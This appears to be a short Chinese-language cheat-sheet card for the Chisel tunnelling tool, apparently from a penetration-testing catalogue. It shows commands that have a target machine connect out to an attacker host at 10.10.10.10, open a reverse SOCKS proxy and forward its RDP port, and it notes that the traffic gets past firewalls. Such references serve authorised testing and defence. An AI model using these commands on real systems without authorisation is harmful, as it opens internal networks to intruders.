### Chisel

| 属性 | 值 |
|------|-----|
| 版本 | 1.7.7 |
| 平台 | 跨平台 |
| 风险 | 🟠 中 |
| 标签 | `内网穿透` `SOCKS5` `隧道` |

## Chisel 内网穿透

### 攻击机启动服务端
```bash
chisel server -p 8080 --reverse
```

### 目标机启动客户端连接并开启反向 SOCKS 代理
```bash
bash chisel_start.sh 10.10.10.10 8080 R:socks
```

### 目标机开启正向端口转发
```bash
bash chisel_start.sh 10.10.10.10 8080 R:3389:127.0.0.1:3389
```

- ✓ 基于 HTTP 传输，易绕过防火墙
- ✓ 支持反向 SOCKS5 代理
- 流量默认加密
